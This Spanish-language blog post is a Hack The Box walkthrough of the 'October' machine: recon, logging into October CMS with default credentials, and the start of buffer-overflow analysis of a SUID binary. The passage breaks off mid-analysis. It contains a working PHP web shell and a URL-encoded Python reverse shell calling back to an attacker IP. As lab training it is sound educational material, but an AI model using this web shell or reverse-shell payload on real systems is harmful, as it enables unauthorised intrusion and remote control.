<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>            Hack The Box October - K4miyo      Ciberseguridad!      </title>
<meta name="description" content="Resolución de la máquina October en la plataforma de Hack The Box">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="K4miyo | Ciberseguridad!">
<meta property="og:title" content="Hack The Box October">
<meta property="og:url" content="http://localhost:4000/htb-october/">


  <meta property="og:description" content="Resolución de la máquina October en la plataforma de Hack The Box">



  <meta property="og:image" content="http://localhost:4000/assets/images/htb-october/october.jpg">





  <meta property="article:published_time" content="2021-09-21T00:00:00-05:00">





  

  


<link rel="canonical" href="http://localhost:4000/htb-october/">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "K4miyo",
      "url": "http://localhost:4000",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="K4miyo | Ciberseguridad! Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
                
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/" >Home</a>
            </li><li class="masthead__menu-item">
              <a href="/year-archive/" >Artículos</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/" >Categorías</a>
            </li><li class="masthead__menu-item">
              <a href="/tags/" >Etiquetas</a>
            </li><li class="masthead__menu-item">
              <a href="/buscador/" >Buscador</a>
            </li><li class="masthead__menu-item">
              <a href="/about/" >Contacto</a>
            </li></ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
    

    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1" />
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">Hack The Box October</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/avatar.png" alt="K4miyo" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">K4miyo</h3>
    
    
      <p class="author__bio" itemprop="description">
        Cyber Threat Inteligence Analyst
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      

      

      

      

      

      

      

      

      

      

      

      

      

      
        <li>
          <a href="https://github.com/k4miyo" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
          </a>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Hack The Box October">
    <meta itemprop="description" content="Resolución de la máquina October en la plataforma de Hack The Box">
    <meta itemprop="datePublished" content="September 21, 2021">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Hack The Box October
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p class="page__meta">
          
            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2021-09-21T00:00:00-05:00">September 21, 2021 </time>&emsp;
          
          
        </p>
        <p><img src="/assets/images/htb-october/banner-october.jpg" alt="" /></p>

<h2 id="october">October</h2>
<p>Se procede con la fase de reconocimiento lanzando primeramente un <code class="language-plaintext highlighter-rouge">ping</code> a la dirección IP 10.10.10.16.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.10.16
PING 10.10.10.16 <span class="o">(</span>10.10.10.16<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
64 bytes from 10.10.10.16: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>140 ms

<span class="nt">---</span> 10.10.10.16 ping statistics <span class="nt">---</span>
1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
rtt min/avg/max/mdev <span class="o">=</span> 139.771/139.771/139.771/0.000 ms
</code></pre></div></div>

<p>De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de <code class="language-plaintext highlighter-rouge">nmap</code> para determinar los puertos abiertos de la máquina y exportanto la información al archivo <strong>allPorts</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.10.16 <span class="nt">-oG</span> allPorts
Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>may be slower.
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-20 21:39 CDT
Initiating SYN Stealth Scan at 21:39
Scanning 10.10.10.16 <span class="o">[</span>65535 ports]
Discovered open port 80/tcp on 10.10.10.16
Discovered open port 22/tcp on 10.10.10.16
Completed SYN Stealth Scan at 21:40, 26.91s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
Nmap scan report <span class="k">for </span>10.10.10.16
Host is up, received user-set <span class="o">(</span>0.30s latency<span class="o">)</span><span class="nb">.</span>
Scanned at 2021-09-20 21:39:45 CDT <span class="k">for </span>27s
Not shown: 65533 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>27.43 seconds
           Raw packets sent: 131086 <span class="o">(</span>5.768MB<span class="o">)</span> | Rcvd: 30 <span class="o">(</span>1.320KB<span class="o">)</span>
</code></pre></div></div>

<p>Mediante la función <a href="/extractPorts">extractPorts</a> definida a nivel de <code class="language-plaintext highlighter-rouge">zsh</code> , se obtiene la información más relevante de la captura grepeable.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ extractPorts allPorts
───────┬───────────────────────────────────────
       │ File: extractPorts.tmp
───────┼───────────────────────────────────────
   1   │ 
   2   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...
   3   │ 
   4   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.10.10.16
   5   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 22,80
   6   │ 
   7   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard
</code></pre></div></div>

<p>A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p22</span>,80 10.10.10.16 <span class="nt">-oN</span> targeted
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-20 21:41 CDT
Nmap scan report <span class="k">for </span>10.10.10.16
Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   1024 79:b1:35:b6:d1:25:12:a3:0c:b5:2e:36:9c:33:26:28 <span class="o">(</span>DSA<span class="o">)</span>
|   2048 16:08:68:51:d1:7b:07:5a:34:66:0d:4c:d0:25:56:f5 <span class="o">(</span>RSA<span class="o">)</span>
|   256 e3:97:a7:92:23:72:bf:1d:09:88:85:b6:6c:17:4e:85 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 89:85:90:98:20:bf:03:5d:35:7f:4a:a9:e1:1b:65:31 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.7 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.7 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: October CMS - Vanilla
| http-methods: 
|_  Potentially risky methods: PUT PATCH DELETE
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>16.53 seconds
</code></pre></div></div>

<p>Vemos que se encuentra el servicio HTTP, por lo que ya sabemos que debemos de ver que tecnologías corren mediante el uso de la herramienta <code class="language-plaintext highlighter-rouge">whatweb</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ whatweb http://10.10.10.16
http://10.10.10.16 <span class="o">[</span>200 OK] Apache[2.4.7], Cookies[october_session], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.7 <span class="o">(</span>Ubuntu<span class="o">)]</span>, HttpOnly[october_session], IP[10.10.10.16], Meta-Author[October CMS], PHP[5.5.9-1ubuntu4.21], Script, Title[October CMS - Vanilla], X-Powered-By[PHP/5.5.9-1ubuntu4.21]
</code></pre></div></div>

<p>Algo que nos llama la atención es el título <strong>October CMS - Vanilla</strong> ya que hace referencia a un gestor de contenido. Investigando un poco, vemos que se trata de un CMS (gestor de contenido); por lo que es posible que tenga un panel de administracion asociado:</p>

<p><a href="https://stackoverflow.com/questions/45815952/octobercms-how-to-open-admin-login-page">stackoverflow.com</a></p>

<p>Vemos que en el recurso <code class="language-plaintext highlighter-rouge">/backend</code> se debe encontrar el panel de adminsitración.</p>

<p><img src="/assets/images/htb-october/october-panel.png" alt="" /></p>

<p>Y efectivamente, tenemos el panel de administración. Ahora, antes de tirar fuerza bruta o cualquier otra cosa, tenemos que ver si existen credenciales por defecto.</p>

<p><a href="https://octobercms.com/forum/post/is-there-a-default-admin-user-password-and-name">octobercms.com</a></p>

<p>Vemos que comentan que las credenciales son <em>admin:admin</em>; así que vamos a probarlas:</p>

<p><img src="/assets/images/htb-october/october-admin.png" alt="" /></p>

<p>Ya estamos dentro del panel de administración del sitio web. Ahora debemos de buscar alguna forma de ingresar a la máquina víctima; si intentamos crear un archivo de extensión <code class="language-plaintext highlighter-rouge">php</code>, vemos que no nos deja; por lo tanto, tenemos que validar que extensiones permite el servidor. En la parte superior izquierda vemos varias opciones, podemos ingresar a <strong>Media</strong> y vemos algo curioso, un archivo de extensión <code class="language-plaintext highlighter-rouge">php5</code>; si lo seleccionamos vemos unas opciones del lado derecho y si le damos en <strong><em>Click here</em></strong>, nos abre el recurso <code class="language-plaintext highlighter-rouge">dr.php5</code>.</p>

<p>Así que podemos crearnos un archivo con extensión <code class="language-plaintext highlighter-rouge">php5</code> y subirlo al servidor:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>k4mishell.php5
───────┬───────────────────────────────────────────────────────────
       │ File: k4mishell.php5
───────┼───────────────────────────────────────────────────────────
   1   │ &lt;?php
   2   │     <span class="nb">echo</span> <span class="s2">"&lt;pre&gt;"</span> <span class="nb">.</span> shell_exec<span class="o">(</span><span class="nv">$_REQUEST</span><span class="o">[</span><span class="s1">'cmd'</span><span class="o">])</span> <span class="nb">.</span> <span class="s2">"&lt;/pre&gt;"</span>
   3   │ ?&gt;
</code></pre></div></div>

<p><img src="/assets/images/htb-october/october-shell.png" alt="" /></p>

<p>Le damos en la opción <strong><em>Click here</em></strong>, se nos abre otra ventana en donde se encuentra nuestro archivo php. Ahora mediante la variable <code class="language-plaintext highlighter-rouge">cmd</code> podemos ejecutar comandos a nivel de sistema.</p>

<p><img src="/assets/images/htb-october/october-cmd.png" alt="" /></p>

<p>Ahora debemos entablarnos una reverse shell a nuestra máquina de atacante. Probando las reverse shell de <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentestmonkey</a>, vemos que <strong>Netcat</strong> no nos deja, así que vamos por otras vías alternativas; como por ejemplo python. Antes de lanzar la reverse shell, vamos a validar si la máquina cuenta con python:</p>

<p><img src="/assets/images/htb-october/october-python.png" alt="" /></p>

<p>Ahora si, lanzamos la reverse shell y nos ponemos en escucha por el puerto 443:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.10.16/storage/app/media/k4mishell.php5?cmd<span class="o">=</span>python%20-c%20%27import%20socket,subprocess,os<span class="p">;</span><span class="nv">s</span><span class="o">=</span>socket.socket<span class="o">(</span>socket.AF_INET,socket.SOCK_STREAM<span class="o">)</span><span class="p">;</span>s.connect<span class="o">((</span>%2210.10.14.16%22,443<span class="o">))</span><span class="p">;</span>os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,0<span class="o">)</span><span class="p">;</span>%20os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,1<span class="o">)</span><span class="p">;</span>%20os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,2<span class="o">)</span><span class="p">;</span><span class="nv">p</span><span class="o">=</span>subprocess.call<span class="o">([</span>%22/bin/sh%22,%22-i%22]<span class="o">)</span><span class="p">;</span>%27
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.16] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.16] 49506
/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
$ whoami
www-data
$ 
</span></code></pre></div></div>

<p>No encontramos dentro de la máquina como el usuario <strong>www-data</strong> y podemos visualizar la flag (user.txt). Como siempre, para trabajar más comodos, hacemos un <a href="/tratamiento-tty">Tratamiento de la tty</a>. Ahora nos queda escalar privilegios y enumeramos un poco el sistema.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@october:/<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
www-data@october:/<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>www-data: 
www-data@october:/<span class="nv">$ </span><span class="nb">cd</span> /
www-data@october:/<span class="nv">$ </span>find <span class="se">\-</span>perm <span class="nt">-4000</span> 2&gt;/dev/null
./bin/umount
./bin/ping
./bin/fusermount
./bin/su
./bin/ping6
./bin/mount
./usr/lib/eject/dmcrypt-get-device
./usr/lib/openssh/ssh-keysign
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/bin/sudo
./usr/bin/newgrp
./usr/bin/pkexec
./usr/bin/passwd
./usr/bin/chfn
./usr/bin/gpasswd
./usr/bin/traceroute6.iputils
./usr/bin/mtr
./usr/bin/chsh
./usr/bin/at
./usr/sbin/pppd
./usr/sbin/uuidd
./usr/local/bin/ovrflw
www-data@october:/<span class="err">$</span>
</code></pre></div></div>

<p>Vemos un archivo curioso que tiene permisos SUID <code class="language-plaintext highlighter-rouge">/usr/local/bin/ovrflw</code>, que ya por el nombre nos hace referencia a <em>Buffer Overflow</em> y al ejecutarlo vemos que nos pide ingresar una cadena de texto.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@october:/<span class="nv">$ </span>/usr/local/bin/ovrflw
Syntax: /usr/local/bin/ovrflw &lt;input string&gt;
www-data@october:/<span class="err">$</span>
</code></pre></div></div>

<p>Validamos el archivo <code class="language-plaintext highlighter-rouge">randomize_va_space</code> y vemos que tiene un 2; por lo que el <strong><em>ASLR (Address Space Layout Randomization)</em></strong> se encuentra activado; lo que dispone de forma aleatoria las posiciones del espacio de direcciones de las áreas de datos clave de un proceso, incluyendo la base del ejecutable y las posiciones de la pila, el <em>heap</em> y las librerías.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@october:/<span class="nv">$ </span><span class="nb">cat</span> /proc/sys/kernel/randomize_va_space 
2
www-data@october:/<span class="err">$</span>
</code></pre></div></div>

<p>Para el análisis del binario, vamos a hacer uso de la herramienta <a href="https://github.com/longld/peda">peda</a>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ git clone https://github.com/longld/peda
Clonando en <span class="s1">'peda'</span>...
remote: Enumerating objects: 382, <span class="k">done</span><span class="nb">.</span>
remote: Counting objects: 100% <span class="o">(</span>9/9<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
remote: Compressing objects: 100% <span class="o">(</span>9/9<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
remote: Total 382 <span class="o">(</span>delta 2<span class="o">)</span>, reused 2 <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused 373
Recibiendo objetos: 100% <span class="o">(</span>382/382<span class="o">)</span>, 290.84 KiB | 1.21 MiB/s, listo.
Resolviendo deltas: 100% <span class="o">(</span>231/231<span class="o">)</span>, listo.
❯ <span class="nb">tar</span> <span class="nt">-cf</span> peda.tar peda
❯ ll
drwxr-xr-x root root 142 B  Tue Sep 21 00:47:20 2021  peda
.rw-r--r-- root root  65 B  Mon Sep 20 22:14:52 2021  k4mishell.php5
.rw-r--r-- root root 660 KB Tue Sep 21 00:47:39 2021  peda.tar
</code></pre></div></div>

<p>Ahora le pasamos el archivo <code class="language-plaintext highlighter-rouge">peda.tar</code> a la máquina víctima.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
10.10.10.16 - - <span class="o">[</span>21/Sep/2021 00:49:51] <span class="s2">"GET /peda.tar HTTP/1.1"</span> 200 -
^C
Keyboard interrupt received, exiting.
❯ 
❯ <span class="nb">md5sum </span>peda.tar
0eb8ec6cc2974c84768b1ae816b6bf55  peda.tar
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@october:/dev/shm<span class="nv">$ </span>wget http://10.10.14.16/peda.tar
<span class="nt">--2021-09-21</span> 08:54:36--  http://10.10.14.16/peda.tar
Connecting to 10.10.14.16:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 675840 <span class="o">(</span>660K<span class="o">)</span> <span class="o">[</span>application/x-tar]
Saving to: <span class="s1">'peda.tar'</span>

100%[<span class="o">=======================================================================================&gt;]</span> 675,840      834KB/s   <span class="k">in </span>0.8s   

2021-09-21 08:54:37 <span class="o">(</span>834 KB/s<span class="o">)</span> - <span class="s1">'peda.tar'</span> saved <span class="o">[</span>675840/675840]

www-data@october:/dev/shm<span class="nv">$ </span><span class="nb">md5sum </span>peda.tar 
0eb8ec6cc2974c84768b1ae816b6bf55  peda.tar
www-data@october:/dev/shm<span class="err">$</span>
</code></pre></div></div>

<p>Descomprimimos el archivo transferido:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@october:/dev/shm<span class="nv">$ </span><span class="nb">tar</span> <span class="nt">-xf</span> peda.tar 
www-data@october:/dev/shm<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 660
drwxrwxrwt  3 root     root         80 Sep 21 08:56 <span class="nb">.</span>
drwxr-xr-x 20 root     root        680 Sep 21 08:14 ..
drwxr-xr-x  4 www-data www-data    200 Sep 21 08:47 peda
<span class="nt">-rw-r--r--</span>  1 www-data www-data 675840 Sep 21 08:47 peda.tar
www-data@october:/dev/shm<span class="nv">$ </span>
</code></pre></div></div>

<p>Ahora instalamos <code class="language-plaintext highlighter-rouge">peda</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@october:/dev/shm<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$HOME</span>

www-data@october:/dev/shm<span class="nv">$ </span><span class="nb">export </span><span class="nv">HOME</span><span class="o">=</span>/dev/shm
www-data@october:~<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$HOME</span>
/dev/shm
www-data@october:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"source ~/peda/peda.py"</span> <span class="o">&gt;&gt;</span> ~/.gdbinit
www-data@october:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 664
drwxrwxrwt  3 root     root        100 Sep 21 08:59 <span class="nb">.</span>
drwxr-xr-x 20 root     root        680 Sep 21 08:14 ..
<span class="nt">-rw-r--r--</span>  1 www-data www-data     22 Sep 21 08:59 .gdbinit
drwxr-xr-x  4 www-data www-data    200 Sep 21 08:47 peda
<span class="nt">-rw-r--r--</span>  1 www-data www-data 675840 Sep 21 08:47 peda.tar
www-data@october:~<span class="err">$</span>
www-data@october:~<span class="nv">$ </span>gdb
GNU gdb <span class="o">(</span>Ubuntu 7.7.1-0ubuntu5~14.04.2<span class="o">)</span> 7.7.1
Copyright <span class="o">(</span>C<span class="o">)</span> 2014 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type <span class="s2">"show copying"</span>
and <span class="s2">"show warranty"</span> <span class="k">for </span>details.
This GDB was configured as <span class="s2">"i686-linux-gnu"</span><span class="nb">.</span>
Type <span class="s2">"show configuration"</span> <span class="k">for </span>configuration details.
For bug reporting instructions, please see:
&lt;http://www.gnu.org/software/gdb/bugs/&gt;.
Find the GDB manual and other documentation resources online at:
&lt;http://www.gnu.org/software/gdb/documentation/&gt;.
For <span class="nb">help</span>, <span class="nb">type</span> <span class="s2">"help"</span><span class="nb">.</span>
Type <span class="s2">"apropos word"</span> to search <span class="k">for </span>commands related to <span class="s2">"word"</span><span class="nb">.</span>
gdb-peda<span class="nv">$ </span>
</code></pre></div></div>

<p>Procedemos al análisis del binario <code class="language-plaintext highlighter-rouge">/usr/local/bin/ovrflw</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@october:~<span class="nv">$ </span>gdb /usr/local/bin/ovrflw <span class="nt">-q</span>
Reading symbols from /usr/local/bin/ovrflw...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
gdb-peda<span class="nv">$ </span>     
gdb-peda<span class="nv">$ </span>checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
gdb-peda<span class="err">$</span>
gdb-peda<span class="nv">$ </span>info functions                                                                                                         
All defined functions:                                                                                                           

Non-debugging symbols:
0x080482f4  _init
0x08048330  <span class="nb">printf</span>@plt
0x08048340  strcpy@plt
0x08048350  __gmon_start__@plt
0x08048360  <span class="nb">exit</span>@plt
0x08048370  __libc_start_main@plt
0x08048380  _start
0x080483b0  __x86.get_pc_thunk.bx
0x080483c0  deregister_tm_clones 
0x080483f0  register_tm_clones
0x08048430  __do_global_dtors_aux
0x08048450  frame_dummy
0x0804847d  main
0x080484d0  __libc_csu_init
0x08048540  __libc_csu_fini
0x08048544  _fini
gdb-peda<span class="err">$</span>
gdb-peda<span class="nv">$ </span>disass main
Dump of assembler code <span class="k">for function </span>main:
   0x0804847d &lt;+0&gt;:     push   ebp
   0x0804847e &lt;+1&gt;:     mov    ebp,esp
   0x08048480 &lt;+3&gt;:     and    esp,0xfffffff0
   0x08048483 &lt;+6&gt;:     add    esp,0xffffff80
   0x08048486 &lt;+9&gt;:     cmp    DWORD PTR <span class="o">[</span>ebp+0x8],0x1
   0x0804848a &lt;+13&gt;:    jg     0x80484ad &lt;main+48&gt;
   0x0804848c &lt;+15&gt;:    mov    eax,DWORD PTR <span class="o">[</span>ebp+0xc]
   0x0804848f &lt;+18&gt;:    mov    eax,DWORD PTR <span class="o">[</span>eax]
   0x08048491 &lt;+20&gt;:    mov    DWORD PTR <span class="o">[</span>esp+0x4],eax
   0x08048495 &lt;+24&gt;:    mov    DWORD PTR <span class="o">[</span>esp],0x8048560
   0x0804849c &lt;+31&gt;:    call   0x8048330 &lt;<span class="nb">printf</span>@plt&gt;
   0x080484a1 &lt;+36&gt;:    mov    DWORD PTR <span class="o">[</span>esp],0x0
   0x080484a8 &lt;+43&gt;:    call   0x8048360 &lt;<span class="nb">exit</span>@plt&gt;
   0x080484ad &lt;+48&gt;:    mov    eax,DWORD PTR <span class="o">[</span>ebp+0xc]
   0x080484b0 &lt;+51&gt;:    add    eax,0x4
   0x080484b3 &lt;+54&gt;:    mov    eax,DWORD PTR <span class="o">[</span>eax]
   0x080484b5 &lt;+56&gt;:    mov    DWORD PTR <span class="o">[</span>esp+0x4],eax
   0x080484b9 &lt;+60&gt;:    lea    eax,[esp+0x1c]
   0x080484bd &lt;+64&gt;:    mov    DWORD PTR <span class="o">[</span>esp],eax
   0x080484c0 &lt;+67&gt;:    call   0x8048340 &lt;strcpy@plt&gt;
   0x080484c5 &lt;+72&gt;:    mov    eax,0x0
   0x080484ca &lt;+77&gt;:    leave  
   0x080484cb &lt;+78&gt;:    ret    
End of assembler dump.
gdb-peda<span class="err">$</span>
</code></pre></div></div>

<p>Vemos que se encuentra habilitado <strong><em>NX</em></strong>, el cual es como el <strong><em>DEP (Data Execution Prevention)</em></strong> de Windows que impide que una aplicación o servicio se ejecute desde una región de memoria no ejecutable; por lo tanto, no podemos cargar nuestro payload malicioso porque no se nos va a interpretar.</p>

<p>Además vemos el uso de la función <code class="language-plaintext highlighter-rouge">strcpy</code> el cual en caso de no estar sanitizada la entrada del usuario, puede ocacionar un buffer overflow. Esto lo podemos ver ejecutando el programa desde <code class="language-plaintext highlighter-rouge">peda</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>r <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print "A"*500'</span><span class="si">)</span>                                                                                         
Starting program: /usr/local/bin/ovrflw <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print "A"*500'</span><span class="si">)</span>                                                             
                                                                                                                                 
Program received signal SIGSEGV, Segmentation fault.                                                                             
<span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>                                                 
EAX: 0x0 
EBX: 0xb7756000 <span class="nt">--</span><span class="o">&gt;</span> 0x1abda8 
ECX: 0xbfc83e70 <span class="o">(</span><span class="s1">'A'</span> &lt;repeats 13 <span class="nb">times</span><span class="o">&gt;)</span>
EDX: 0xbfc82a43 <span class="o">(</span><span class="s1">'A'</span> &lt;repeats 13 <span class="nb">times</span><span class="o">&gt;)</span>
ESI: 0x0 
EDI: 0x0 
EBP: 0x41414141 <span class="o">(</span><span class="s1">'AAAA'</span><span class="o">)</span>
ESP: 0xbfc828d0 <span class="o">(</span><span class="s1">'A'</span> &lt;repeats 200 <span class="nb">times</span><span class="o">&gt;</span>...<span class="o">)</span>
EIP: 0x41414141 <span class="o">(</span><span class="s1">'AAAA'</span><span class="o">)</span>
EFLAGS: 0x10202 <span class="o">(</span>carry parity adjust zero sign <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
<span class="o">[</span><span class="nt">-------------------------------------code-------------------------------------</span><span class="o">]</span>
